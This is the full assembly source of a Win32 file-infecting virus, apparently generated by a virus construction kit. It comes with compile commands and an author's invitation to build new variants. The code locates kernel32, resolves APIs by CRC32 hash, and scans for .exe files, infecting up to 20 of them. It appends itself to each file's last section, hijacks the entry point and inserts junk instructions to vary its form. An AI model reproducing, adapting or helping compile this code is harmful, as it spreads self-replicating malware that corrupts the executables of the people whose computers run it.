              
;
;
; Win32.NGVCK84 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK84
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 32
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop edx
 sub edx, offset Delta
                                        ; mov ebp, edx
                                        ; clear ebp
 mov ebp, -60682d
 add ebp, 60682d
 add ebp, edx
 jmp KernelSearchStart


;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov esi, eax
                                        ; clear esi
 mov esi, 0
 add esi, eax
                                        ; mov ebx, esi
                                        ; clear ebx
 xor ebx, ebx
 add ebx, esi
LenCRC:
                                        ; add ebx, 1
 sub ebx, -1d
 cmp byte ptr [ebx], 0
 jne LenCRC
 sub ebx, esi
                                        ; mov edi, ebx
 push ebx
 pop edi
                                        ; add edi, 1
 inc edi
 cld
                                        ; clear edx
 mov edx, 0
 sub edx, 1
                                        ; mov eax, edx
                                        ; clear eax
 mov eax, -44060d
 add eax, 44060d
 add eax, edx
NextByteCRC:
                                        ; clear ebx
 mov ebx, 0
                                        ; clear ecx
 mov ecx, -20110d
 add ecx, 20110d
 mov bl, byte ptr [esi]
                                        ; add esi, 1
 sub esi, -1d
 xor bl, dl
 mov dl, dh
 mov dh, al
 mov al, ah
 mov ah, 8
NextBitCRC:
 shr cx, 1
 rcr bx, 1
jnc NoCRC
 xor bx,08320h
 xor cx,0EDB8h
NoCRC:
 dec ah
jnz NextBitCRC
 xor edx, ebx
 xor eax, ecx
 dec edi
jnz NextByteCRC
 not eax
 not edx
 mov ebx, eax
 rol ebx, 16d
 mov bx, dx
 mov dword ptr [ebp+APICRC32], ebx
 popad
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 and edx, edx                           ; Trash
 mov ecx, 80000000h or 40000000h
 push ecx
 lea ecx, [ebp+WFD_szFileName]
 xchg eax, ecx

 push eax
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ecx
 push ecx

                                        ; clear ebx
 sub ebx, ebx
 push ebx
 push ecx
 push ebx
 push 00000004h
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], -1
 and dword ptr [ebp+MapHandle], eax
 pop ecx
 cmp eax, 0
 je CloseFile
 push ecx
 push 0
 push 0
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 add eax, 1d
 sub eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov ebx, ebp
 add ebx, offset WIN32_FIND_DATA

 push ebx
 mov ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea ebx, [ebp+WFD_szFileName]
 sub ecx, ebx                           ; Trash
 xchg edx, ebx

                                        ; mov eax, 276
 mov eax, ( 276d + 8d )
 sub eax, 8d

ClearOldData2:
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 add edx, 1d
 dec eax
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 dec edx                                ; Trash
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg esi, ecx

 push esi
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret





;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear ebx
 xor ebx, ebx
 add ebx, NumberOfApis

                                        ; load API Names and Offsets
 lea eax, [ebp+APIOffsets]

 mov edi, ebp
 add edi, offset APINames


GetApisLoop: 

                                        ; search 'em
                                        ; edi points to the CRC
                                        ; eax points to the offset

 call SearchAPI1
                                        ; add edi, 4
 inc edi
 add edi, 3d
 mov esi, dword ptr [ebp+TempAPI]
 mov dword ptr [eax], 0
 add dword ptr [eax], esi
                                        ; add eax, 4
 dec eax
 add eax, 5d
 sub ebx, 1
 jnz GetApisLoop
 jmp Outbreak



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov eax, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [eax+3Ch]
 add esi, eax
                                        ; get File Alignment
 mov ebx, [esi+3Ch]
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], ebx
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], edx
 call Align
                                        ; mov edx, -1
 mov edx, ( -1d + 25d )
 sub edx, 25d
 and edx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], edx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], edx
 call CreateMap
 jc NoEXE
                                        ; clear esi
 push 0
 pop esi
 add esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, esi
 add edx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 mov esi, edx
                                        ; get last section
                                        ; clear ecx
 mov ecx, -63621d
 add ecx, 63621d
 mov cx, word ptr [esi+06h]
 dec ecx
 imul ecx, ecx, 28h
 add edx, ecx
                                        ; add edx, 120
 inc edx
 add edx, 119d
 mov eax, dword ptr [esi+74h]
 sal eax, 3
 add edx, eax
                                        ; get old Entrypoint
 mov ecx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 xor dword ptr [ebp+OldBase], ecx
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], eax
 mov eax, [edx+10h]
                                        ; mov ebx, eax
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, eax
 add edx, 14h
 add eax, [edx]
 sub edx, 14h
 push eax
 mov ecx, ebx
 add edx, 0Ch
 add ecx, [edx]
 sub edx, 0Ch
 mov dword ptr [ebp+NewEIP], ecx
 and dword ptr [ebp+Trash1], 476633     ; Trash
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], ecx
                                        ; clear ecx
 sub ecx, ecx

 add ecx, [edx+10h]
 push ecx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg1], ecx
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [edx+10h], ecx
 pop ecx
 add ecx, VirusSize
 mov dword ptr [edx+08h], 0
 add dword ptr [edx+08h], ecx
 mov ecx, dword ptr [edx+10h]
 add ecx, dword ptr [edx+0Ch]
 mov dword ptr [esi+50h], ecx
                                        ; set write, read and code flag
 or dword ptr [edx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov eax, VirusSize
 lea ecx, [ebp+Virus]
 xchg ecx, esi


AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 add edx, -1
 mov dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 stc
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 NewSize     dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 TempApisearch3 dd 0h
 MapHandle   dd 0h
 db 'Win32.NGVCK84 created by SnakeByte',0
 AlignReg1   dd 0h
 MapAddress  dd 0h
 OldBase     dd 400000h

 APINames:
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 03C19E536h           ; SetFileAttributesA
 dd 0C633D3DEh           ; GetFileAttributesA
 dd 094524B42h           ; UnmapViewOfFile
 dd 08C892DDFh           ; CreateFileA
 dd 0C200BE21h           ; FindClose
 dd 068624A9Dh           ; CloseHandle
 dd 0797B49ECh           ; MapViewOfFile
 dd 0AA700106h           ; FindNextFileA

 TempAPI     dd 0h
 Trash1      dd 0h

 APIOffsets:
 XFindFirstFileA        dd 0h
 XCreateFileMappingA    dd 0h
 XSetFileAttributesA    dd 0h
 XGetFileAttributesA    dd 0h
 XUnmapViewOfFile       dd 0h
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XCloseHandle           dd 0h
 XMapViewOfFile         dd 0h
 XFindNextFileA         dd 0h

 counter     dw 0h
 Trash2      dd 0h
 OTableVA    dd 0h
 KernelPE    dd 0h
 FindHandle  dd 0h
 ATableVA    dd 0h
 NewEIP      dd 0h
 K32Trys     dd 0h
 Attributes  dd 0h
 OldEIP      dd 0h
 FileHandle  dd 0h
 AlignReg2   dd 0h
 NTableVA    dd 0h
 APICRC32    dd 0h
 InfCounter  dd 0h
 filemask    db '*.exE',0
 KernelMZ    dd 0h
 TempApisearch2 dd 0h




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], esi

 mov edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edx

                                        ; mov edi, -1
 push -1d
 pop edi
 and edi, dword ptr [ebp+Trash1]

 mov dword ptr [ebp+Trash2], edi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 xor edx, eax                           ; Trash
 mov eax,12345678h
 org $-4
 retEIP dd 0h
 add eax,12345678h
 org $-4
 retBase dd 0h
 push eax
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 mov edx, 26022d
 sub edx, 26022d
 mov ecx, dword ptr [ebp+AlignReg2]
 push eax
 div ecx
 xor ebx, eax                           ; Trash
 sub ecx, edx
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel by using hardcoded values
 mov edx, 077f00000h
 call GetKernel32
 jnc GetApis
 mov edx, 077e00000h
 call GetKernel32
 jnc GetApis
 mov edx, 0bff70000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear ecx
 mov ecx, 0

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[ecx]
 lea ebx, [ebp+GetKernel32Exception]
 dec dword ptr [ebp+Trash1]             ; Trash
 xchg ebx, ecx

 push ecx
 push eax

                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 6h

GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jz GetKernel32NotFound
                                        ; check for ZM
 cmp word ptr [edx], 'ZM'
 je CheckPE
 xor ebx, edx                           ; Trash

GK2:
 add edx, -65536d
 mov eax, dword ptr [ebp+K32Trys]
 dec eax
 push eax
 pop dword ptr [ebp+K32Trys]
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov esi, [edx+3Ch]
 neg edx
 sub esi, edx
 neg edx
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add esi, 22
 add esi, 22d
                                        ; clear eax
 mov eax, -37069d
 add eax, 37069d
 movzx eax, word ptr [esi]
 and ax, 0F000h
 cmp ax, 02000h
 jne GK2
GotDLL:                                 ; we found a DLL file
 inc esi
 sub esi, 23d


KernelFound:
 mov dword ptr [ebp+KernelMZ], edx
 mov dword ptr [ebp+KernelPE], esi

                                        ; clear esi
 sub esi, esi

 pop dword ptr fs:[esi]
 pop eax
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear ecx
 mov ecx, -34697d
 add ecx, 34697d

 mov eax, dword ptr fs:[ecx]
 mov esp, dword ptr [eax]
GetKernel32NotFound:
                                        ; clear eax
 mov eax, 50300d
 sub eax, 50300d

 pop dword ptr fs:[eax]
 pop edx
 popad
 stc
ret


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 mov edx, ebp
 add edx, offset WFD_szFileName

 push edx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov eax, 128
 mov eax, 128d
 push eax
 mov edx, offset WFD_szFileName
 add edx, ebp


 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 add eax, -1
 inc eax
 jz NoInfection
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [ecx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [ecx+3Ch]
 pop edx
                                        ; check if header lies inside the file
 cmp edx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edx, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je Goodfile2
                                        ; mov ebx, 16019
 mov ebx, ( 16019d xor 38d )
 xor ebx, 38d
 cmp ebx, 16019d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], 'NGVC'
 jz Notagoodfile
                                        ; check for DLL
 mov ax, word ptr [edx+16h]
 and ax, 0F000h
 cmp ax, 02000h
 je Notagoodfile
                                        ; check for OBJ
 mov ax, word ptr [edx+16h]
 and ax, 00002h
 cmp ax, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 xor ebx, 70905159d                     ; Trash
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
                                        ; clear ebx
 mov ebx, 65769d
 sub ebx, 65769d
 xor ebx, dword ptr [ebp+Attributes]
 push ebx
 mov ebx, offset WFD_szFileName
 add ebx, ebp

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
                                        ; clear the counter
 and word ptr [ebp+counter], 0h



 mov eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ebx
 and ebx, 0
 add ebx, [eax+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 add ebx, 28d
                                        ; get ATableVA
 mov eax, dword ptr [ebx]
                                        ; add ebx, 4
 inc ebx
 add ebx, 3d
 sal ecx, 9d                            ; Trash
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; get NTableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push ebx
 mov edx, dword ptr [ebp+KernelMZ]
 add edx, dword ptr [ebx]
                                        ; mov ebx, edx
 push edx
 pop ebx
                                        ; mov eax, edx
 mov eax, edx
 mov dword ptr [ebp+TempApisearch2], eax
 mov dword ptr [ebp+TempApisearch3], edi
 cld

                                        ; eax Points to API-Name ( Kernel )
                                        ; edi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 mov ecx, dword ptr [ebp+APICRC32]
 sub ecx, dword ptr [edi]
                                        ; add ecx, 1
 add ecx, 1d
 dec ecx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop ebx
 mov eax, dword ptr [ebp+TempApisearch2]
                                        ; clear edi
 mov edi, 66843d
 sub edi, 66843d
 add edi, dword ptr [ebp+TempApisearch3]
                                        ; add ebx, 4
 add ebx, 4d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop ebx
                                        ; retrieve the offset
 movzx edx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 mov eax, edx
                                        ; clear edx
 sub edx, edx
 mov dx, word ptr [eax]
 clc
 rcl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [edx]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop eax
 popad
 jmp ExecuteHost



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; mov edi, -1
 mov edi, ( -1d - 27d )
 add edi, 27d
 and edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], edi

                                        ; mov edx, -1
 mov edx, 0
 add edx, -1d
 and edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edx
 adc dword ptr [ebp+Trash1], 437526     ; Trash




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov eax, offset filemask
 add eax, ebp

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
                                        ; mov ebx, -1
 mov ebx, -1d
 and ebx, dword ptr [ebp+InfCounter]
 or ebx, ebx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

